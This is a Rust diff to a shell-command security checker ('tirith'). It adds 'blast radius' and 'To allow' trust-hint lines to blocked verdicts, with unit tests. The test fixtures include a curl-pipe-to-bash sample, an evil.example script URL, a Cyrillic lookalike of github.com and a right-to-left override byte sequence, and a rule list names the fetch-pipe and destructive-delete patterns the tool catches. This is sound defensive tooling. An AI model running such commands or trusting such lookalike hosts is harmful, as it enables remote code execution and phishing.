@@ -1,7 +1,7 @@
 use std::io::Write;
 
 use crate::safe_command::SafeSuggestion;
-use crate::verdict::{Action, Evidence, Finding, Verdict};
+use crate::verdict::{Action, Evidence, Finding, RuleId, Verdict};
 
 const SCHEMA_VERSION: u32 = 3;
 
@@ -172,6 +172,10 @@ pub fn write_human(verdict: &Verdict, warn_only: bool, mut w: impl Write) -> std
         }
     }
 
+    if verdict.action == Action::Block {
+        write_block_advisories(verdict, &mut w)?;
+    }
+
     if verdict.action == Action::Block && verdict.bypass_available {
         if is_warn_only_block {
             writeln!(
@@ -187,6 +191,99 @@ pub fn write_human(verdict: &Verdict, warn_only: bool, mut w: impl Write) -> std
     }
 
     Ok(())
+}
+
+/// True for the destructive-filesystem and fetch-pipe rules whose presence in a
+/// Block verdict warrants the blast-radius header (item 14c). Covers the whole
+/// `Blast*` family (both the hot-path `cheap_check` rules and the
+/// `tirith preview` simulator rules, so a preview verdict reads the same) and
+/// every pipe-to-interpreter variant. Match is exhaustive on purpose: a new
+/// destructive/fetch RuleId surfaces here as a compile error to be triaged.
+fn is_destructive_or_fetch_pipe(r: RuleId) -> bool {
+    matches!(
+        r,
+        RuleId::BlastDeletesOutsideRepo
+            | RuleId::BlastWritesSystemPath
+            | RuleId::BlastSymlinkTraversal
+            | RuleId::BlastEmptyVarGlob
+            | RuleId::BlastFindDelete
+            | RuleId::BlastRsyncDelete
+            | RuleId::BlastLargeFileCount
+            | RuleId::PipeToInterpreter
+            | RuleId::CurlPipeShell
+            | RuleId::WgetPipeShell
+            | RuleId::HttpiePipeShell
+            | RuleId::XhPipeShell
+    )
+}
+
+/// Shared advisory block appended to a `Block` verdict by both `write_human` and
+/// `write_human_no_color` (presentation only — no detection/verdict logic).
+///
+/// Emits, in order:
+/// * **14c blast-radius header** — when the verdict ALREADY contains any
+///   destructive/fetch-pipe finding (the engine ran `blast_radius::cheap_check`
+///   on the exec path, so this only summarizes existing findings; it never
+///   recomputes). One line, pointing at `tirith preview`.
+/// * **14a "To allow" line** — the first finding carrying a URL or host in its
+///   evidence yields a copy-pasteable `tirith trust add` invocation. A full URL
+///   is a NARROW trust pattern (no `--broad`); a bare domain needs `--broad`
+///   because `trust add` rejects bare domains otherwise. Findings without any
+///   URL/host (e.g. a destructive-fs block) emit no line.
+///
+/// Both lines are part of the BLOCK verdict the user must see — unconditional,
+/// never gated on a quiet flag.
+fn write_block_advisories(verdict: &Verdict, mut w: impl Write) -> std::io::Result<()> {
+    // 14c — summarize the destructive/fetch-pipe findings already in the verdict.
+    let destructive_count = verdict
+        .findings
+        .iter()
+        .filter(|f| is_destructive_or_fetch_pipe(f.rule_id))
+        .count();
+    if destructive_count > 0 {
+        writeln!(
+            w,
+            "  blast radius: {destructive_count} finding(s) here can destroy files or run remote code — preview with `tirith preview -- <cmd>`"
+        )?;
+    }
+
+    // 14a — first finding with a URL or host in its evidence yields a trust hint.
+    for finding in &verdict.findings {
+        let rule = finding.rule_id; // snake_case via Display
+                                    // Prefer a full URL: it is a NARROW trust pattern, so no `--broad`.
+        if let Some(url) = first_url_in_evidence(&finding.evidence) {
+            writeln!(
+                w,
+                "  To allow: tirith trust add {} --rule {rule} --ttl 30d",
+                sanitize_field(url)
+            )?;
+            break;
+        }
+        // Else fall back to a bare domain; `trust add` rejects bare domains
+        // without `--broad`, and `--broad` trusts the whole domain.
+        let domains = crate::session_warnings::extract_domains_from_evidence(&finding.evidence);
+        if let Some(domain) = domains.first() {
+            writeln!(
+                w,
+                "  To allow (trusts the whole domain): tirith trust add {} --broad --rule {rule} --ttl 30d",
+                sanitize_field(domain)
+            )?;
+            break;
+        }
+    }
+
+    Ok(())
+}
+
+/// The raw string of the first `Evidence::Url` in a finding's evidence, if any.
+/// This is the only `Evidence` variant that carries a full URL verbatim; host-
+/// only variants (`HostComparison`) are handled by the domain fallback in
+/// [`write_block_advisories`].
+fn first_url_in_evidence(evidence: &[Evidence]) -> Option<&str> {
+    evidence.iter().find_map(|ev| match ev {
+        Evidence::Url { raw } => Some(raw.as_str()),
+        _ => None,
+    })
 }
 
 /// Format a string highlighting suspicious characters — red background when
@@ -353,6 +450,10 @@ fn write_human_no_color(
         if !fix.is_empty() {
             writeln!(w, "    Fix: {fix}")?;
         }
+    }
+
+    if verdict.action == Action::Block {
+        write_block_advisories(verdict, &mut w)?;
     }
 
     if verdict.action == Action::Block && verdict.bypass_available {
@@ -695,6 +796,211 @@ mod tests {
         assert!(
             !cout.contains("\x1b[2J"),
             "color Visual line must strip the attacker's clear-screen CSI: {cout}"
+        );
+    }
+
+    /// Helper: a Block verdict carrying a single finding with the given rule and
+    /// evidence, mirroring `block_verdict_with_bypass`'s field initialization.
+    fn block_verdict_with_evidence(rule_id: RuleId, evidence: Vec<Evidence>) -> Verdict {
+        let mut v = Verdict::from_findings(
+            vec![Finding {
+                rule_id,
+                severity: Severity::High,
+                title: "t".to_string(),
+                description: "d".to_string(),
+                evidence,
+                human_view: None,
+                agent_view: None,
+                mitre_id: None,
+                custom_rule_id: None,
+            }],
+            3,
+            Timings::default(),
+        );
+        v.action = Action::Block;
+        v.bypass_available = true;
+        v
+    }
+
+    #[test]
+    fn block_with_full_url_renders_to_allow_without_broad() {
+        // 14a: a finding carrying a full URL emits the NARROW trust line — the
+        // exact URL, the snake_case rule id, a 30d TTL, and NO `--broad`.
+        let verdict = block_verdict_with_evidence(
+            RuleId::ShortenedUrl,
+            vec![Evidence::Url {
+                raw: "https://bit.ly/x".to_string(),
+            }],
+        );
+        for color in [false, true] {
+            let mut buf = Vec::new();
+            if color {
+                write_human(&verdict, false, &mut buf).unwrap();
+            } else {
+                write_human_no_color(&verdict, false, &mut buf).unwrap();
+            }
+            let out = String::from_utf8(buf).unwrap();
+            assert!(
+                out.contains(
+                    "To allow: tirith trust add https://bit.ly/x --rule shortened_url --ttl 30d"
+                ),
+                "full-URL block must render the narrow To-allow line (color={color}): {out}"
+            );
+            assert!(
+                !out.contains("--broad"),
+                "a full URL is a narrow trust pattern — no --broad (color={color}): {out}"
+            );
+        }
+    }
+
+    #[test]
+    fn block_with_bare_domain_only_renders_broad_to_allow() {
+        // 14a: a finding with only a HOST (no full URL) must emit the domain form
+        // WITH `--broad`, because `trust add` rejects bare domains otherwise.
+        let verdict = block_verdict_with_evidence(
+            RuleId::ConfusableDomain,
+            vec![Evidence::HostComparison {
+                raw_host: "gіthub.com".to_string(),
+                similar_to: "github.com".to_string(),
+            }],
+        );
+        let mut buf = Vec::new();
+        write_human_no_color(&verdict, false, &mut buf).unwrap();
+        let out = String::from_utf8(buf).unwrap();
+        assert!(
+            out.contains(
+                "To allow (trusts the whole domain): tirith trust add gіthub.com --broad --rule confusable_domain --ttl 30d"
+            ),
+            "bare-domain block must render the --broad To-allow line: {out}"
+        );
+    }
+
+    #[test]
+    fn block_with_url_and_host_prefers_full_url_no_broad() {
+        // When both a full URL and a host are present, the full URL wins (narrow,
+        // no --broad) and only ONE To-allow line is emitted.
+        let verdict = block_verdict_with_evidence(
+            RuleId::PlainHttpToSink,
+            vec![
+                Evidence::HostComparison {
+                    raw_host: "evil.example".to_string(),
+                    similar_to: "ok.example".to_string(),
+                },
+                Evidence::Url {
+                    raw: "http://evil.example/x.sh".to_string(),
+                },
+            ],
+        );
+        let mut buf = Vec::new();
+        write_human_no_color(&verdict, false, &mut buf).unwrap();
+        let out = String::from_utf8(buf).unwrap();
+        assert!(
+            out.contains(
+                "tirith trust add http://evil.example/x.sh --rule plain_http_to_sink --ttl 30d"
+            ),
+            "full URL must be preferred over the host: {out}"
+        );
+        assert!(
+            !out.contains("--broad"),
+            "full-URL path must not use --broad: {out}"
+        );
+        assert_eq!(
+            out.matches("To allow").count(),
+            1,
+            "exactly one To-allow line: {out}"
+        );
+    }
+
+    #[test]
+    fn block_with_destructive_finding_renders_blast_radius_header() {
+        // 14c: a Block containing a destructive Blast* finding renders the
+        // blast-radius header pointing at `tirith preview`.
+        let verdict = block_verdict_with_evidence(
+            RuleId::BlastDeletesOutsideRepo,
+            vec![Evidence::Text {
+                detail: "target '/home' is outside the repo".to_string(),
+            }],
+        );
+        for color in [false, true] {
+            let mut buf = Vec::new();
+            if color {
+                write_human(&verdict, false, &mut buf).unwrap();
+            } else {
+                write_human_no_color(&verdict, false, &mut buf).unwrap();
+            }
+            let out = String::from_utf8(buf).unwrap();
+            assert!(
+                out.contains("blast radius:") && out.contains("tirith preview -- <cmd>"),
+                "destructive block must render the blast-radius header (color={color}): {out}"
+            );
+        }
+    }
+
+    #[test]
+    fn block_with_fetch_pipe_finding_renders_blast_radius_header() {
+        // 14c: the fetch-pipe family (here CurlPipeShell) also trips the header.
+        let verdict = block_verdict_with_evidence(
+            RuleId::CurlPipeShell,
+            vec![Evidence::Text {
+                detail: "curl https://x | bash".to_string(),
+            }],
+        );
+        let mut buf = Vec::new();
+        write_human_no_color(&verdict, false, &mut buf).unwrap();
+        let out = String::from_utf8(buf).unwrap();
+        assert!(
+            out.contains("blast radius:"),
+            "curl-pipe-shell block must render the blast-radius header: {out}"
+        );
+    }
+
+    #[test]
+    fn block_without_url_or_destructive_renders_neither_advisory() {
+        // A non-URL, non-destructive block (e.g. a bidi-control terminal finding
+        // whose only evidence is a byte sequence) must emit NEITHER the To-allow
+        // line NOR the blast-radius header.
+        let verdict = block_verdict_with_evidence(
+            RuleId::BidiControls,
+            vec![Evidence::ByteSequence {
+                offset: 0,
+                hex: "e2 80 ae".to_string(),
+                description: "RIGHT-TO-LEFT OVERRIDE".to_string(),
+            }],
+        );
+        let mut buf = Vec::new();
+        write_human_no_color(&verdict, false, &mut buf).unwrap();
+        let out = String::from_utf8(buf).unwrap();
+        assert!(
+            !out.contains("To allow"),
+            "no URL/host → no To-allow line: {out}"
+        );
+        assert!(
+            !out.contains("blast radius:"),
+            "non-destructive → no blast-radius header: {out}"
+        );
+    }
+
+    #[test]
+    fn non_block_verdict_renders_no_block_advisories() {
+        // The advisories are gated on Action::Block; a Warn verdict (even with a
+        // URL) must not show them.
+        let mut verdict = block_verdict_with_evidence(
+            RuleId::ShortenedUrl,
+            vec![Evidence::Url {
+                raw: "https://bit.ly/x".to_string(),
+            }],
+        );
+        verdict.action = Action::Warn;
+        let mut buf = Vec::new();
+        write_human_no_color(&verdict, false, &mut buf).unwrap();
+        let out = String::from_utf8(buf).unwrap();
+        assert!(
+            !out.contains("To allow"),
+            "Warn must not show To-allow: {out}"
+        );
+        assert!(
+            !out.contains("blast radius:"),
+            "Warn must not show blast-radius: {out}"
         );
     }
 
